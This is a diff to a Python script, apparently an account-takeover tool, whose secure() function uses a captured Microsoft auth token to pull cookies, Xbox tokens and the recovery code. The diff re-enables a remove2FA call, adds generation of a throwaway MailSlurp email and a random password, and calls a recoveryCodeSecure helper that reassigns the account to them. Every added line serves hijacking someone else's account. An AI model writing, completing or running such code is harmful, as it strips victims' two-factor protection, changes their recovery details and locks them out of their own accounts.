@@ -1,7 +1,9 @@
 from views.utils.securityInformation import securityInformation
+from views.utils.recoveryCodeSecure import recoveryCodeSecure
 from views.utils.getRecoveryCode import getRecoveryCode
 from views.utils.getAccountInfo import getAccountInfo
 from views.utils.removeServices import removeServices
+from views.utils.generateEmail import generateEmail
 from views.utils.removeProof import removeProof
 from views.utils.getCookies import getCookies
 from views.utils.polishHost import polishHost
@@ -13,9 +15,12 @@ from views.utils.getAMRP import getAMRP
 from views.utils.getSSID import getSSID
 from views.utils.getXBL import getXBL
 from views.utils.getT import getT
+import secrets
 import json
 
 def secure(msaauth: str):
+    
+    mailslurp_key = json.load(open("config.json", "r+"))["tokens"]["mailslurp_key"]
 
     accountInfo = {
         "oldName": "Failed to Get",
@@ -131,11 +136,11 @@ def secure(msaauth: str):
             print("[+] - Got AMRP")
             proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"
 
-            # remove2FA(amrp, cookies[1], cookies[2])
+            remove2FA(amrp, cookies[1], cookies[2])
 
             # To be fixed ###########################################
             #                                                       #
-            # removeProof(amrp, cookies[1], cookies[2], proofsID)   #
+            # removeProof(amrp, cookies[1], cookies[2], proofsID)   #                                            
             # removeServices(amrp, cookies[2], cookies[0])          #
             #                                                       #
             #########################################################
@@ -168,6 +173,11 @@ def secure(msaauth: str):
                 print("[+] - Got Recovery Code")
 
                 accountInfo["recoveryCode"] = recoveryCode
+
+                new_email = generateEmail(mailslurp_key)
+                new_password = secrets.token_urlsafe(13)
+
+                recoveryCodeSecure(email, recoveryCode, new_email, new_password) 
             
     
     return accountInfo
